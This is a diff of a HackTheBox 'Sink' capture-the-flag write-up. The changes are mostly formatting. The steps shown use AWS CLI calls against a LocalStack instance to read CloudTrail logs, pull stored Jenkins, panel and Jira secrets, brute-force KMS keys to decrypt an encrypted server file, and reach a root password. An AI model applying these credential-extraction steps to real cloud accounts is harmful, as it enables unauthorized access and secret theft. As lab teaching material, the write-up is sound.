@@ -1,5 +1,5 @@
 <div align="center">
-	<img src="./images/info.png">
+	<img src="file:///home/kourosh/CTF/HackTheBox/Machines/Sink_UR/images/info.png">
 </div>
 
 | Name             | Tenet                                                                                                  |
@@ -379,7 +379,7 @@ Let's enumerate this aws instance with `awslocal` command
 
 ## AWS logs service
 
-+ Describe Log Groups
+1. Describe Log Groups
 
 ```bash
 awslocal logs describe-log-groups --endpoint-url http://127.0.0.1:4566
@@ -397,7 +397,7 @@ awslocal logs describe-log-groups --endpoint-url http://127.0.0.1:4566
 }
 ```
 
-+ Describe Log Strems of `cloudtrail`
+2. Describe Log Strems of `cloudtrail`
 
 ```bash
 aws logs describe-log-streams --log-group-name cloudtrail --endpoint-url http://127.0.0.1:4566
@@ -418,7 +418,7 @@ aws logs describe-log-streams --log-group-name cloudtrail --endpoint-url http://
 }
 ```
 
-+ Get Log Events of `20201222` stream
+3. Get Log Events of `20201222` stream
 
 ```bash
 aws logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222 --endpoint-url http://localhost:4566
@@ -473,7 +473,8 @@ If you want to read more about it see [get-log-events](https://docs.aws.amazon.c
 
 Let's enumerate `secretsmanager` service to see what can we get
 
-+ List Secrets
+1. List Secrets
+
 ```bash
 aws secretsmanager list-secrets --endpoint-url http://localhost:4566
 
@@ -535,9 +536,10 @@ aws secretsmanager list-secrets --endpoint-url http://localhost:4566
 ```
 
 Here are 3 secrets let's grab their values with their `ARN` names
-+ Get Secret Value
+2. Get Secret Value
 
 Jenkins Login secret
+
 ```bash
 awslocal secretsmanager  get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-NBFjo' --endpoint-url http://localhost:4566
 {
@@ -553,6 +555,7 @@ awslocal secretsmanager  get-secret-value --secret-id 'arn:aws:secretsmanager:us
 ```
 
 Sink Panel secret
+
 ```bash
 awslocal secretsmanager  get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-anYLp' --endpoint-url http://localhost:4566
 {
@@ -568,6 +571,7 @@ awslocal secretsmanager  get-secret-value --secret-id 'arn:aws:secretsmanager:us
 ```
 
 Jira Support secret
+
 ```bash
 awslocal secretsmanager  get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-HvtSE' --endpoint-url http://localhost:4566
 {
@@ -603,7 +607,7 @@ So we need some type of key, Looks like there should be something interesting in
 ## KMS Service
 
 This is our last service and it's a `key management service`\
-Let's first list the key
+1. Let's first list the key
 
 ```bash
 awslocal kms list-keys --endpoint-url http://localhost:4566
@@ -673,7 +677,7 @@ Ok we have a bunch of random key Ids which we can use for decryption
 |10|f0579746-10c3-4fd1-b2ab-f312a5a0f3fc|
 |11|f2358fef-e813-4c59-87c8-70e50f6d4f70|
 
-Let's use these keys to decrypt that `servers.enc` file\
+2. Let's use these keys to decrypt that `servers.enc` file\
 According to [AWS kms decrypt documentations](https://docs.aws.amazon.com/cli/latest/reference/kms/index.html)
 
 ```bash
@@ -689,7 +693,7 @@ We need
 + cipher file
 + key id
 The important thing that doen not exsit in this example and it is necessary for decrypting the file is `EncryptionAlgorithm`, which is mentioned at the end of the document.\
-So with this final command we can decrypt the `servers.enc` file
+3. So with this final command we can decrypt the `servers.enc` file
 
 ```bash
 awslocal kms decrypt --key-id <KEY-ID> --encryption-algorithm RSAES_OAEP_SHA_256 --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext --endpoint-url http://localhost:4566 | base64 --decode > file.dec
@@ -705,8 +709,9 @@ An error occurred (DisabledException) when calling the Decrypt operation: 881df7
 
 ```
 
-After examining all of them, key number 6 with key-id `804125db-bdf1-465a-a058-07fc87c0fad0` will decrypt the file successfully\
+4. After examining all of them, key number 6 with key-id `804125db-bdf1-465a-a058-07fc87c0fad0` will decrypt the file successfully\
 So the final command for decryption is
+
 ```bash
 david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext --endpoint-url http://localhost:4566 | base64 --decode > file.dec
 david@sink:~/Projects/Prod_Deployment$ file file.dec 
@@ -740,6 +745,7 @@ And booom we can log into the box with root user and password `_uezduQ!EY5AHfe2`
 ![root](./images/root.png)
 
 And here is the root flag
+
 ```bash
 david@sink:~/Projects/Prod_Deployment$ su root
 Password: 
